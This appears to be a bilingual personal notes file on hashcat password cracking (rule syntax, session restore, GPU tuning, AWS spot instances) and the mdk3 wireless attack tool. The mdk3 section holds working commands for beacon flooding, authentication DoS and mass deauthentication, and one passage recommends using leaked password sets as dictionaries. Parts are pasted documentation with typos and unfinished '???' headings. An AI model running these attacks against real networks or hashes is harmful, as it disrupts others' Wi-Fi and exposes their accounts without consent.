The rule-engine in Hashcat was written to that all functions that share the same letter-name are 100% compatibility to John the Ripper and PasswordPro rules and vice versa. Later we started to introduce some of our own functions that are not compatible. But these functions got their own letter-names to avoid conflicts.
####Implemented compatible functions

Name|Function|Description|Example Rule|Input Word|Output Word|Note
--|--|--|--|--|--|--
Nothing|:|do nothing|:|p@ssW0rd|p@ssW0rd|
Lowercase|l|Lowercase all letters|l|p@ssW0rd|p@ssw0rd|
Uppercase|u|Uppercase all letters|u|p@ssW0rd|P@SSW0RD|
Capitalize|c|Capitalize the first letter and lower the rest|c|p@ssW0rd|P@ssw0rd|
Invert Capitalize|C|Lowercase first found character,uppercase the rest|C|p@ssW0rd|p@SSW0RD|
Toggle Case|t|Toggle the case of all characters in word|t|p@ssW0rd|P@SSw0RD|
Toggle @|TN|Toggle the case of characters at position N|T3|p@ssW0rd|p@sSW0rd|*
Reverse|r|Reverse the entire word|r|p@ssW0rd|dr0Wss@p|
Duplicate|d|Duplicate the entire word|d|p@ssW0rd|p@ssW0rdp@ssW0rd|
Duplicate N|pN|Append duplicated word N times|p2|p@ssW0rd|p@ssW0rdp@ssW0rdp@ssW0rd|
Reflect|f|Duplicate word reversed|f|p@ssW0rd|p@ssW0rddr0Wss@p|
Rotate Left|{|Rotates the word left|{|p@ssW0rd|@ssW0rdp|
Rotate Right|}|Rotates the word right|}|p@ssW0rd|dp@ssW0rd|
Append Character|$X|Append character X to end|$1|p@ssW0rd|p@ssW0rd1|
Prepend Character|^X|Prepend X to front|^1|p@ssW0rd|1p@ssW0rd|
Truncate left|[|Deletes first character|[|p@ssW0rd|@ssW0rd|
Truncate right|]|Deletes last character|]|p@ssW0rd|p@ssW0r|
Delete @ N|DN|Deletes character at position N|D3|p@ssW0rd|p@sW0rd|*
Extract range|xNM|Extracts M characters, starting at position N|x04|p@ssW0rd|p@ss|*
Omit range|ONM|Deletes M characters, starting at position N|O12|p@ssW0rd|psW0rd|*
Insert @ N|iNX|Inserts character X at position N|i4!|p@ssW0rd|p@ss!W0rd|*
Overwrite @ N|oNX|Overwrites character at position N with X|o3$|p@ssW0rd|p@s$W0rd|*
Truncate @ N|'N|Truncate word at position N|'6|p@ssW0rd|p@ssW0|*
Replace|sXY|Replace all instances of X with Y|ss$|p@ssW0rd|p@$$W0rd|
Purge|@X|Purge all instances of X|@s|p@ssW0rd|p@W0rd|+
Duplicate first N|zN|Duplicates first character N times|z2|p@ssW0rd|ppp@ssW0rd|
Duplicate last N|ZN|Duplicates last character N times|Z2|p@ssW0rd|p@ssW0rddd|
Duplicate all|q|Duplicate every character|q|p@ssW0rd|pp@@ssssWW00rrdd|
Extract memory|XNMI|Insert substring of length M starting from position N of word saved to memory at position I|lMX428|p@ssW0rd|p@ssw0rdw0|+
Append memory|4|Append the word saved to memory to current word|uMl4|p@ssW0rd|p@ssw0rdP@SSW0RD|+
Prepend memory|6|Prepend the word saved to memory to current word|rMr6|p@ssW0rd|dr0Wss@pp@ssW0rd|+
Memorize|M|Memorize current word|lMuX084|p@ssW0rd|P@SSp@ssw0rdW0RD|+
* `*` Indicates that N starts at 0. For character positions other than 0-9 use A-Z(A=10)
* `+` Indicates that this rule is implemented in hashcat only.
* `#` Changed in oclHashcat v1.37→ v1.38 and hashcat v0.51 → v0.52
#### Rules used to reject plains

Name|Function|Description|Example Rule|Note
--|--|--|--|--
Reject less|`<N`|Reject plains if their length is greater than N|`<G`|*
Reject greater|`>N`|Reject plains if their length is less or equal to N|`>8`|*
Reject equal|`_N`|Reject plains of length not equal to N|`_7`|*
Reject contain|`!X`|Reject plains which contain char X|`!z`|
Reject not contain|`/X`|Reject plains which do not contain char X|`/e`|
Reject equal first|`(X`|Reject plains which do not start with X|`(h`|
Reject equal last|`)X`|Reject plains which do not end with X|`)t`|
Reject equal at|`=NX`|Reject plains which do not have char X at position N|`=1a`|*
Reject contains|`%NX`|Reject plains which contain char X less than N times|`%2a`|*
Reject contains|`Q`|Reject plains where the memory saved matches current word|`rMrQ`|e.g. for palindrome
Note: Reject rules only work either with hashcat-legacy, or when using `-j` or `-k` with hashcat. They will not work as regular rules (in a rule file) with hashcat.
`*` Indicates that N starts at 0. For character positions other than 0-9 use A-Z (A=10)
#### Implemented specific functions
The following functions are not available in John the Ripper and/or PasswordsPro:

Name|Function|Description|Example Rule|Input Word|Output Word|Note
--|--|--|--|--|--|--
Swap front|k|Swap first two characters|k|p@ssW0rd|@pssW0rd|
Swap back|K|Swap last two characters|K|p@ssW0rd|p@ssW0dr|
Swap @ N|*NM|Swaps character at position N with character at position M|*34|p@ssW0rd|p@sWs0rd|*
Bitwise shift left|LN|Bitwise shift left character @ N|L2|p@ssw0rd|p@æsW0rd|*
Bitwise shift right|RN|Bitwise shift right character @ N|R2|p@ssW0rd|p@9sW0rd|*
Ascii increment|+N|Increment character @ N by 1 ascii value|+2|p@ssW0rd|p@tsW0rd|*
Ascii decrement|-N|Decrement character @ N by 1 ascii value|-1|p@ssW0rd|p?ssW0rd|*
Replace N+1|.N|Replaces character @ N with value at @ N plus 1|.1|p@ssW0rd|psssW0rd|*
Replace N-1|,N|Replaces character @ N with value at @ N minus 1|,1|p@ssW0rd|ppssW0rd|*
Duplicate block front|yN|Duplicates first N characters|y2|p@ssW0rd|p@p@ssW0rd|*
Duplicates block back|YN|Duplicates last N characters|Y2|p@ssW0rd|p@ssW0rdrd|*
Title|E|Lower case the whole line, then upper case the first letter and every letter after a space|E|p@ssW0rd w0rld|P@ssw0rd W0rld|*
Title w/separator|eX|Lowercase the whole line, then upper case the first letter and every letter after a custom separator character|e-|p@ssW0rd-w0rld|P@ssw0rd-W0rld|+
* `*` Indicates that N starts at 0. For character positions other than 0-9 use A-Z (A=10)
* `+` Only in JtR?
#### Writing rules
The most important thing in writing rules is knowing what you want to write.That typically means you have to analyze dozens of plaintext passwords, maybe from a customer, to see a pattern. For example, a common pattern is that people append a digit to their passwords to improve its strength. So we have two "parameters":
* We want to append something.
* The value we want to append is a *digit*.
If we take a look at the function overview we see that we can append something using the `$` function. So, for example, if we want to add a "1" to our password, we write a rule that looks like this.
`$1`
Simple enough. But what if we want to do all numbers 1-9? Well that's what we call a Hybrid attack, just take a look at this page.
Also note:
* Whites spaces are ignored as long as they are not used as a parameter. That enables formating of our "source code" a bit.
* To comment out some text, it has to start with a `#` char.
#### Generating rules
There are two ways to automatically "generate" rules.
* Using the maskprocessor, we have a dedicated article on this topic here: [Using maskprocessor to create rules](https://hashcat.net/wiki/doku.php?id=rules_with_maskprocessor)
* Using random rules
##### Using maskprocessor to generate rules
Let's suppose you want to make a rule which adds 3 digits after each words of your dict, and save the rules in a file called "append_3_digits.rule".
###### By hand

        $ vim append_3_digits.rule
        $0 $0 $0
        $0 $0 $1
        $0 $0 $2
        $0 $0 $3
        $0 $0 $4
        $0 $0 $5
        $0 $0 $6
        $0 $0 $7
        $0 $0 $8
        $0 $0 $9
        $0 $1 $0
        $0 $1 $1
        and so on...
As you can see, creating rules by hand could be very boring and time-consuming :p
###### Using maskprocessor
`$ ./map64.bin -o append_3_digits.rule '$?d $?d $?d'`
maskprocessor allows you to easily and quickly generate rule files.
Syntax:
* `$` is the function to append a char
* `?d` is the digits charset
###### Example Commands
Here are some example commands to enable you to generate common rules locally on your own computer.

        mp64.exe -1 0123456789 "^?1^?1^?1" -o Prefix-0-999.rule
        mp64.exe -1 0123456789 "l^?1^?1^?1" -o Lower-All-Prefix-0-999.rule
        mp64.exe -1 0123456789 "c^?1^?1^?1" -o Upper-First-Prefix-0-999.rule
        mp64.exe -1 0123456789 "d^?1^?1^?1" -o Double-Word-Prefix-0-999.rule

        mp64.exe -1 0123456789 "$?1$?1$?1" -o Suffix-0-999.rule
        mp64.exe -1 0123456789 "l$?1$?1$?1" -o Lower-All-Suffix-0-999.rule
        mp64.exe -1 0123456789 "c$?1$?1$?1" -o Upper-First-Suffix-0-999.rule
        mp64.exe -1 0123456789 "u$?1$?1$?1" -o Upper-All-Suffix-0-999.rule
        mp64.exe -1 0123456789 "d$?1$?1$?1" -o Double-Word-Suffix-0-999.rule
* Paste them into a text file and name it "Hashcat Rule Generator.cmd".
* Place this new file in the same directory as maskprocessor and double left click it.
You should very quickly be presented with a group of commonly used password modifications. Each rule file is individually named to help you understand its function.
###### Limitation
On Windows, when trying to insert the `^` character, enclose it in quotes. `^` is an escape character in the Windows command shell, and will not be printed unless quoted.
Example:
`mp32.exe -1 0123456789 "^"?1"^"?1"^"?1 -o "Prefix 0-999.rule"`
NOT
`mp32.exe -1 0123456789 ^?1^?1^?1 -o "Prefix 0-999.rule"`
##### Random rules
This is a very unique hashcat feature. With hashcat you can generate random rules on the fly to be used for that session. This is a good thing if you are out of ideas on what to do next when you have already tried all your rules on all your dictionaries. There are three configuration parameters:
Tells hashcat to generate NUM rules to be applied to each attempt:
`--generate-rules=NUM`
Specifies the number of functions that should be used (minimum to maximum range):
`--generate-rules-func-min=NUM`
`--generate-rules-func-max=NUM`
This number can be unlimited but large numbers are not recommended. When used in conjunction with -g, any rule outside of this setting will be ignored.
For example, it could randomly generate the rules "l r", "l ^f", and "sa@", these are all valid rules to be used. However, "l ^f sa@ r $3" would be ignored as it contains 5 functions. Default: min=1 max=4
You can mix your rules from a rules-file with randomly generated rules. For example, if your rules-file contains 200 rules and you use `-g 500`, it will generate 300 additional rules.
#### Debugging rules
With hashcat we can debug our rules easily. That means we can verify that the rule we wrote actually does what we want it to do. All you need to use is the `--stdout` switch and omit the hashlist.
Here is an example:
Create simple dictionary:
`$ echo WORD > word`
Generate a simple rule. The "c" rule capitalizes the first letter and lower-cases the rest.
`$ echo c > rule`
And that's how we see the generated debug output:
`$ ./hashcat-cli64.bin -r rule --stdout word`
`Word`
This "feature" is also a very fast password candidate generator. That means that if we have some external program that supports reading from stdin we can feed it with our output.
Note: `--stdout` must be used with CPU, not GPU. However, only `-D 2` (device-type 2 stands for GPU) with `--stdout` works.
#### Multi-rules
With release of old oclHashcat-plus v0.07 a complete new feature in the rule-based cracking world was added.
Instead of just giving one `-r` parameter and a file, you can now add as many `-r`s as you want.
They are not executed in a sequence!
Each rule of each rule-file is combined with each rule of each rule-file. This way you can easily cook you own attack mode.

        $ cat 123.rule
        $1
        $2
        $3

        $cat abc.rule
        $a
        $b
        $c

        $ hashcat --stdout -r 123.rule -r abc.rule wordlist
        hashcat1a
        hashcat2a
        hashcat3a
        hashcat1b
        hashcat2b
        hashcat3b
        hashcat1c
        hashcat2c
        hashcat3c
Because the total number of generated rules is the product of all list, stacking multiple large lists can quickly exceed available memory. But a few well-chosen rules can be stacked to great effect.
#### Using existing rule files

        ls -l /usr/share/hashcat/rules/
        total 2412
        -rw-r--r-- 1 root root    284 Dec  4  2015 best64.rule
        -rw-r--r-- 1 root root    692 Dec  4  2015 combinator.rule
        -rw-r--r-- 1 root root 242503 Dec  4  2015 d3ad0ne.rule
        -rw-r--r-- 1 root root 973248 Dec  4  2015 dive.rule
        -rw-r--r-- 1 root root  92810 Dec  4  2015 generated.rule
        -rw-r--r-- 1 root root 324926 Dec  4  2015 Incisive-leetspeak.rule
        -rw-r--r-- 1 root root  42026 Dec  4  2015 InsidePro-HashManager.rule
        -rw-r--r-- 1 root root  22963 Dec  4  2015 InsidePro-PasswordsPro.rule
        -rw-r--r-- 1 root root    327 Dec  4  2015 leetspeak.rule
        -rw-r--r-- 1 root root  37939 Dec  4  2015 Ninja-leetspeak.rule
        -rw-r--r-- 1 root root   1536 Dec  4  2015 oscommerce.rule
        -rw-r--r-- 1 root root 331161 Dec  4  2015 rockyou-30000.rule
        -rw-r--r-- 1 root root   1774 Dec  4  2015 specific.rule
        -rw-r--r-- 1 root root  68087 Dec  4  2015 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
        -rw-r--r-- 1 root root   2508 Dec  4  2015 T0XlC-insert_space_and_special_0_F.rule
        -rw-r--r-- 1 root root  36039 Dec  4  2015 T0XlC-insert_top_100_passwords_1_G.rule
        -rw-r--r-- 1 root root  38904 Dec  4  2015 T0XlC.rule
        -rw-r--r-- 1 root root 116633 Dec  4  2015 T0XlCv1.rule
        -rw-r--r-- 1 root root     60 Dec  4  2015 toggles1.rule
        -rw-r--r-- 1 root root    690 Dec  4  2015 toggles2.rule
        -rw-r--r-- 1 root root   4330 Dec  4  2015 toggles3.rule
        -rw-r--r-- 1 root root  17980 Dec  4  2015 toggles4.rule
        -rw-r--r-- 1 root root  54016 Dec  4  2015 toggles5.rule

![performance of rule files](rules_table.png)
### ???How to process more than one hash files???
The new version of Hashcat is designed to run on GPUs an is designed to only process a single hash file so that's not quite practical though there are scenarios where you may want to actually only try to crack one password hash it is not a situation it is all that comment.
Currently, oclHashcat-plus does not support multiple WPA2 hashes in a single instance. One way to work around this is to have three separate instances. So basically:
1. Have three separate directories with oclHashcat-plus or Hashcat.
2. Launch the processes in parallel. Make sure that all of them have drastically lowered `-n` and `-u` values.
If you are using CPU Hashcat, do the same thing but adjust the `-n` parameter only.
This is  totally inefficient but should work.
### run Hashcat dynamically???
So here's the process I go through. I define a sequence of jobs I want to run. By jobs I really mean what kind of rules and attack types I want to perform. I then analyze the results both at the end of the run and during the run. I don't like to wait till the end of the run necessarily if the run's going to take a long time. So I don't want to run something for eight hours and find out it was going to crack zero password. So what I've done is I've created a bash script that check every 15 seconds to see how many passwords has been cracked at what frequency and whether that frequency over that increment of time overall is increasing, decreasing going down to zero. So I can continue a run or I can suspend it or terminate it based on how successful it is or I can resume it in a later time. So that allows me to eliminate or adjust jobs based on the results but where it gets even more dynamic is I can create new dictionaries either during a run or after a run based on the output of the other one. So the output what is looks like? The output is going to be a file that has a hash in it and on the same line it's going to have the plaintext password that was cracked. There's some other things you can have included it too, like the hash version of that really depends on that your needs are and then I rerun the jobs based on the new dictionaries I created and the new rules I determine will be beneficial. So a dictionary my just be the passwords that I've cracked. So I could if I cracked half a million passwords out of eHarmony I may add those to my initial dictionary file which can consist of dictionaries of English words, dictionaries of words from other languages. So other password leaks are really a good source of password dictionaries.
### Suspend and Resume a session
#### Description
The .restore file format is a custom format,specifically developed for hashcat. hashcat supports resuming cracking jobs for each and every hash type, attack mode, input type (even stdin) etc. It doesn't even matter why the job was stopped as long as you have a .restore file with all the information needed for hashcat to continue cracking (and the directories/dictionaries/masks/rules/hashes/hash files etc  used within the original cracking job). No matter if you had a power failure or you just stopped the cracking job because you wanted to sleep near your hardware, with `--restore` you should be able to resume the cracking job.
It's important to know that the .restore file will be updated whenever this line is the status screen changes:
`Restore.Point...:`
...and **not** whenever this line changes (hashcat needs to reach the next restore checkpoint):
Progress......:
The second important thing to note is that quitting hashcat via the **Checkpoint stop** feature, by hitting 'c', will wait until the restore file has been updated to quit, whereas forcing hashcat to quit by hitting 'q' will not. By using 'q' instead of 'c' you run the risk of losing progress due to the restore file having not been recently updated.
When pressing 'c', you will be prompted with "Check point enabled. Will quit at next restore-point update."
The .restore file will be automatically deleted whenever the full cracking job was finished (exhausted) or whenever every hash within the hash list was cracked.
To disable the restore support you can use `--restore-disable`. If you want to specify a different path to the restore file you can use `--restore-file-path`.???
#### Restore howto
Consider that you used this command lien to start a cracking job:
`hashcat -m 0 -a 3 --sessin session_name example0.hash masks/rockyou-7-2592000.hcmask`
and you hit 'c' (or 'q' for quit) while it was running ( or it was stopped/killed for some other reasons).
This command resumes the above cracking job:
`hashcat --session session_name --restore`
The `--restore` command does not need nor allow any further arguments except from `--session` (and `--restore` itself). You cannot simply ad or change some arguments when you restore the job. If you really insist to changes any arguments, you might be able to use some external tools (like analyze_hc_restore) at your own risk.
#### Saving the restore file
* Saving the restore file under a custom directory
    `hashcat64.exe -a 3 -m 2500  E:\cap\TP-LINK_54AA-01\TP-LINK_54AA-01.hccapx ?d?d?d?d?d?d?d?d --session test_session --restore-file-path E:\cap\test_session.restore`
    Without `--restore-file-path E:\cap\test_session.restore`, the .restore file will be saved under the current directory as <session_name>.restore.
* Restore the process
    `hashcat64.exe --session test_session --restore --restore_file-path E:\cap\test_session.restore`
    Without `--restore-file-path E:\cap\test_session.restore`, the restore process will search for <session_name>.restore file.
    The only parameters allowed when restoring a session are:
    * `--restore`(required): tell hashcat that it should restore a previous session.
    * `--session`(optional):specify the session name of the previous session that hashcat should restore
    Note: if you did use `--session` when starting the cracking job, you also need to use `--session` with the same session name to restore it.
    Further parameters and switches are currently not allowed, e.g. you can't simply add `-w 3` when restoring (i.e. `--restore -w 3`) because it will be ignored.
### Run Hashcat dynamically

### 关于GPU参数优化 [ 这次根本没用到 ]和自定义破解规则[比较复杂,但更智能灵活,可这也就意味着速度就..嘿嘿,你懂的]方面的东西,这里暂时就不提了,仅仅作为hash破解入门,这些差不多足以应对你日常的各种破解需求了
### 关于在实际破解中自己的一些建议,暂以大批量hash爆破为例[事先没有任何密码规律可循,只能盲测的那种情况]
* 首先,弱口令字典先走一遍再说
* 其次,跑掩码,把所有想跑的掩码全部事先放到.hcmask文件中,然后加载它自动跑,上面已有介绍
* 或者,如果只是针对单条hash,在上述方法都跑不出来的情况下,可以去仔细分析下目标的密码设置规律,再尝试组合,可能效率会高一点,但那也只是可能
* 最后,如果你自己真的有能力,可以想办法把它做成分布式快速hash破解产品[密码机],然后拿到市面上去卖,也是完全可行的,毕竟已经有很多成功的案例,只不过你可能更多应该考虑下怎么比别人做的效率更高,更易用,不然,很难有市场
### HashCat参数优化
HashCat本身考虑到系统资源的分配，默认参数下并没有最大化的来使用硬件资源。如果我们想要让破解速度最大化，就需要对一些参数进行配置。
#### for new versions
* `-w 1`: Watch movies or play games (even such that require high FPS count), lowest performance
* `-w 2`: Normal desktop operations or "economic" mode (like internet browsing, texteditor, etc), default setting
* `-w 3`: Headless systems or dedicated cracking systems, highest performance
#### 1.Workload tuning 负载调优。
该参数支持的值有1,8,40,80,160
`--gpu-accel 160`
可以让GPU发挥最大性能。
#### 2.Gpu loops 负载微调
该参数支持的值的范围是8-1024（有些算法只支持到1000）。
`--gpu-loops 1024`
可以让GPU发挥最大性能。
#### 3.Segment size 字典缓存大小
该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越好XD。
`--segment-size 512`
可以提高大字典破解的速度。



### choose devices, device-types, and platforms
!!! hashcat --help | grep "device\|platform"
Please don't confuse OpenCL platforms (Intel OpenCL CPU driver, Intel GPU driver, nvidia OpenCL GPU driver, AMD OpenCL CPU driver, AMD OpenCL GPU drivers, pocl opencl drivers, mesa...) with oclHashcat's device types (selected by `-D`: CPU, GPU, FPGA, DSP, Co-Processor) or confuse it even the selection of the device (`-d`) from a list of OpenCL devices.
These are all different concepts and it clearly says that the output is a list of different OpenCL platforms (OpenCL Platform #...), while you specified a selection of "device types" on the command line.
If in doubt, it should be enough to jsut have a glance at the `--help` output: it even list and explains all the "device types" (the current output is):

        - [OpenCL Device Types]-

          # | Device Type
        ===+|=====================
        1   | CPU
        2   | GPU
        3   | FPGA, DSP, Co-Processor
The list of platforms won't (and probably can't easily) be exactly ordered by the device types...these are different concepts and, for instance, you could have many platforms of the same device type etc.
The only thing one could ask is "Why did oclHashcat's devs define opencl-device-type 1 as CPU devices, while most opencl drivers ordering of platform IDs start with all GPU devices?"...Well, also this might depend on your hardware and probably other factors (like which version of opencl drivers you've installed etc).
I would just recommend that we shouldn't care about this ordering of platforms too much, but remember that:
1. by selecting the opencl device types you choose between CPU, GPU, FPGA (multiple choices possible),
2. the list of platforms depend on the drivers installed (can even be multiple drivers for a single device, like AMD OpenCL CPU driver and native OpenCL Intel driver for the same OpenCL-compatible CPU) and hence the ICDs found on the system
3. and ultimately the user can select (from the "filtered" list) the device with the `--opencl-devices` (`-d`) command lien argument.

Command line|Example|Description
--|--|--
`-I`, `--opencl-info`|`-I`|Show information about detected OpenCL platforms/devices
`--opencl-platforms`|`--opencl-platforms=2`|OpenCL platforms to use, separated with commas
`-D`, `--opencl-device-types`|`-D 1`|OpenCL device-types to use, separated with commas
`-d`, `--opencl-devices`|`-d 1`|OpenCL devices to use, separated with commas

## mdk3 <a name=mkd3></a>
### installation
* 首先获取源代码

            wget http://linux.gungoos.com/mdk3-v6.tar.gz
            tar xvzf mdk3-v6.tar.gz
            cd mdk3-v6
  如果遇到这种错误,试试直接用Firefox访问那个地址下载吧。
* 修改Makefile文件

            sudo vim Makefile
    将 “-lpthread” 替换成 “-pthread”。之后按ctrl + x -> Y (enter) -> enter
* 编译

        sudo make
    这里make之后会刷出很多warnings，但并不影响编译。
* 安装

        sudo make install
* 测试

        sudo mdk3
### use modes
#### Beacon Flood Mode
这个模式可以产生大量死亡SSID来充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID、加密方式（如wep/wpa2）等。

        mdk3 mon0 b
              -n <ssid>        #自定义ESSID
              -f <filename>            #读取ESSID列表文件
              -v <filename>           #自定义ESSID和BSSID对应列表文件
              -d         #自定义为Ad-Hoc模式
              -w         #自定义为wep模式
              -g           #54Mbit模式
              -t            # WPA TKIP encryption
              -a           #WPA AES encryption
              -m          #读取数据库的mac地址
               -c <chan>                   #自定义信道
               -s <pps>                #发包速率
        mdk3 --help b  #查看详细内容
##### Example 1
`sudo mdk3 mon0 b -f wordlist1.txt -a -c 6 -s 80`

./wordlist1.txt

        burpS
        WPSHAK
##### Example 2
固定FakeAP的MAC
`sudo mdk3 mon0 b -v wordlist2.txt -a -c 6 -s 80`

./wordlsit2.txt

        AA:BB:CC:DD:AA:EE burpSuite
        11:22:33:DD:AA:EE WPSHAK
##### 效果说明
PC可以容易看到 FakeAP，但是 Android 的 WLAN 扫描不容易看到，原因暂不明。
#### Authentication Dos Mode
##### 详细说明
这是一种验证请求攻击模式：在这个模式里，软件自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接客户端的响应；这个模式常见的使用是在 reaver 穷据路由 PIN 码，当遇到AP被“pin死”时，可以用这个模式来直接让AP停止正常响应，迫使AP主人重启路由。

        mdk3 mon0 a
              -a <ap_mac>              #测试指定BSSID
              -m              #使用有效数据库中的客户端mac地址
              -c          #对应 -a ，不检查是否测试成功
              -i  <ap_mac>           #对指定BSSID进行智能攻击
              -s <pps>               #速率，默认50
##### Example 1
`sudo mdk33 mon0 a -a EC:88:8F:A1:A5:90 -s 200`
似乎无效
手机连接AP正常上网
#### Deauthentication/Disassociation Amok Mode
##### 详细说明
这个模式看名称就知道大概了：强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击……可以造成一定范围内的无线网络瘫痪（当然有白名单，黑名单模式），直到手动停止攻击。

        mdk3 mon0 d
              -w <filename>             #白名单mac地址列表文件
              -b <filename>              #黑名单mac地址列表文件
              -s <pps>                        #速率，这个模式下默认无限制
              -c [chan,chan,chan,...]                  #信道，可以多填，如 2,4,5,1
##### Example 1
`sudo mdk3 d -s 120 -c 1,6,11`
#### Basic probing and ESSID Bruteforce Mode
##### 详细介绍
基本探测AP信息和ESSID猜解模式

        mdk3 mon0 p
              -e <ssid>          #待检测的ssid
              -f <filename>          #检测AP设置为隐藏的ssid列表文件
              -t <bssid>               #用bssid检测AP的信息
              -s <pps>                #速率，默认300
              -b <character set>              #设置字符集
## VPS for hashcat

There are only AWS EC2 instances available.
### AWS EC2
#### how to choose instances
!!!Instances suitable for Hashcat
##### [P2 Instance Details](https://amazonaws-china.com/ec2/instance-types/p2/)

Name|GPUs|vGPUs|RAM|Network Brandwidth|Benchmark for WPA!!!
--|--|--|--|--
p2.xlarge|1|4|61|High
p2.8xlarge|8|32|488|10Gbps
p2.16xlarge|16|64|732|20Gbps

##### [p3 Instance Details](https://amazonaws-china.com/ec2/instance-types/p3/)

Instance Size|GPUs(Tesla V100)|GPU Peer to Peer|GPU Memory(GB)|vGPUs|Memory(GB)|Network Bandwidth|Benchmark for WPA!!!
p3.2xlarge|1|N/A|16|8|61|Up to 10 Gbps
p3.8xlarge|4|NVLink|64|32|244|10 Gbps
p3.16xlarge|8|NVLink|128|64|488|25Gbps
#### ways to pay
It's on demand meaning that you can turn it on and off as you need it. It's scalable meaning that if you want to have more than one machine and they have the machines available you can purchases the services of additional machine. So if you want to crack passwords ten times fast you could fire up 10 servers.
There are four ways to pay for Amazon EC2 instances: On-Demond, Spot Instances,Reserved Instances, and Dedicated Hosts.
???the former two ways need to config every reboot ?
##### About reboot
The shutdown behavior is pretty interesting because you can specify that automatically when you build the server. If you shut it down or the server shuts down unexpectedly it's either going to shutdown or terminate. If you shutdown the machine you can restart it at a future point and however you had it configured and whatever data stored on it will still be there. So it's persistent between shutdowns and startups. But if you terminate a machine the data is all going to be gone. So you don't want to terminate a machine if you expect you're going to want to utilize the software on it or the data on it in the future.
###### Reboot Your Instance
An instance reboot is equivalent to an operating system reboot. In most cases, it takes only a few minutes to reboot your instance. When you reboot an instance, it remains on the same physical host, so your instance keeps it public DNS name (IPv4), private IPv4 address, IPv6 address (if applicable), and any data on its instance store volumes.
Rebooting an instance doesn't start a new instance billing period (with a minimum one-minute charge), unlike stopping and restarting your instance.
We might schedule your instance for a reboot for necessary maintenance, such as to apply updates that require a reboot. No action is required on your part; we recommend that you wait for the reboot to occur within its scheduled window. For more information, see Scheduled Events for Your Instances.
We recommend that you use the Amazon EC2 console, a command line tool, or the Amazon EC2 API to reboot your instance instead of running the operating system reboot command from your instance. If you use the Amazon EC2 console, a command line tool, or the Amazon EC2 API to reboot your instance, we perform a hard reboot if the instance does not cleanly shut down within four minutes. If you use AWS CloudTrail, then using Amazon EC2 to reboot your instance also creates an API record of when your instance was rebooted.
* To reboot an instance using the console
    1. Open the Amazon EC2 console.
    2. In the navigation pane, choose **Instances**.
    3. Select the instance and choose **Actions**, **Instance State**, **Reboot**.
    4. Choose **Yes**, **Reboot** when prompted for confirmation.
* To reboot an instance using the command line
    You can use one of the following commands. For more information about these command line interfaces, see Accessing Amazon EC2.
    * reboot-instances (AWS CLI)
    * Restart-EC2Instance (AWS Tools for Windows PowerShell)
##### [Amazon EC2 Spot Instances Pricing](https://amazonaws-china.com/ec2/spot/pricing/)
With Spot instances, You pay the Spot price that's in effect for the time period your instances are running. Spot instance prices are set by Amazon EC2 and adjust gradually based on long-term trends in supply and demand for Spot instance capacity. The following table displays the Spot price for each region and instance type (updated every 5 minutes).
Spot instances are available at a discount of up to 90% off compared to On-Demand pricing. To compare the current Spot prices against standard On-Demand rates, visit the [Spot Instance Advisor](https://amazonaws-china.com/ec2/spot/instance-advisor/).
You can bid on excess capacity that Amazon has and so in this particular case for a GPU box you can see they actually show me in the bottom middle left that it actually costs around 35 cents per hour for their available capacity. I bid 55 cents per hour. They would only charge me with the going rate so if I bid 55 cents and the going rate is 35 then they only charge m 35 cents .
Spot instances are also available to run for a predefined duration-in hourly increments up to six hours in length-at a discount of up to 30-50% compared to On-Demand pricing.

GPU Instances-Current Generation|Linux/UNIX Usage|Windows Usage
g2.2xlarge|N/A*|N/A*
g2.8xlarge|N/A*|N/A*
g3.4xlarge|$0.342 per Hour|$1.078 per Hour
g3.8xlarge|$0.684 per Hour|$2.156 per Hour
g3.16xlarge|$2.5154 per Hour|$5.3877 per Hour
p2.xlarge|$0.27 per Hour|$0.454 per Hour
p2.8xlarge|$2.16 per Hour|$3.632 per Hour
p2.16xlarge|$14.4 per Hour|$17.344 per Hour
p3.2xlarge|$1.0555 per Hour|$1.286 per Hour
p3.8xlarge|$4.2244 per Hour|$5.144 per Hour
p3.16xlarge|$7.344 per Hour|$10.288 per Hour
###### Amazon EC2 Spot Can Now Stop and Start Your Spot Instances
Amazon EC2 Spot now allows Amazon EBS-backed instances to be stopped in the event of interruption, instead of being terminated when capacity is no longer available at your preferred price. Spot can then fulfill your request by restarting instances from a stopped state when capacity is available within your price and time requirements. To use this new feature, choose "stop" instead of "terminate" as the interruption behavior when submitting a persistent Spot request. When you choose "stop", Spot will shut down your instance upon interruption. The EBS root device and attached EBS volumes are saved, and their data persists. When capacity is available again within your price and time requirements, Spot will restart your instance. Upon restart, the EBS root device is restored from its prior state, previously attached data volumes are reattached, and the instance retains its instance ID.
This feature is available for persistent Spot requests and Spot Fleets with the "maintain" fleet option enabled. You will not be charged for instance usage while your instance is stopped. EBS volume storage is charged at standard rates. You can cancel your bid at any time to terminate stopped instances. This feature is only available for instances with an Amazon EBS volume as their root device.
###### how to request and launch a Spot Instance
Spot Instances can be requested using the AWS Management Console or Amazon EC2 APIs. To start with the AWS Management Console simply:
1. Log in to the AWS Management Console, then click the "Amazon EC2" tab.
2. Click on "Spot Requests" in the navigation pane on the left.
3. Click on "Pricing History" to open a view of historical pricing selectable by instance type. This will help you choose a maximum price for your request. Pricing shown is specific to the Availability Zone selected. If no Availability Zone is selected, you will see the prices or each Availability Zone in the Region.
4. Click on "Request Spot Instances" and proceed through the Launch Instance Wizard process, choosing an AMI(stands for Amazon Machine Image) and instance type. Enter the number of Spot Instances you would like to request, your maximum price and whether the request is persistent or not. After choosing your key pair and security group(s), you are ready to submit your Spot Instance request.
So basically you have your on-demand instances which keeps on running and you have to pay the hourly charges for it. Spot Instances are those instances, for example, AWS have certain amount of hardware which is available 24/7 and which is not in use actually. So AWS offers to use those hardwares and computer sources on a very cheaper price. So what happens is that there could be a resource available so you can place your bid that you want certain type of instance at a particular price. Say for example, you want c3.large instance at the price of say 0.05 $/hour, the price for this type of instance of on-demand is 0.105 $/hour. So you can bid at a particular rate or maybe the best possible minimum rate in the market and you can if the hardware is available then you can get that instance up and running. So this is how you pay less for the same computer source. And in case that somebody else requires that hardware at the price say 0.43 $/hour and if AWS don't have another resource available then it will terminate yours and it will give it to someone else then in that case your instance will get terminated. So this is how the Spot Instance works.
* Here you can specify what kind of request type is:
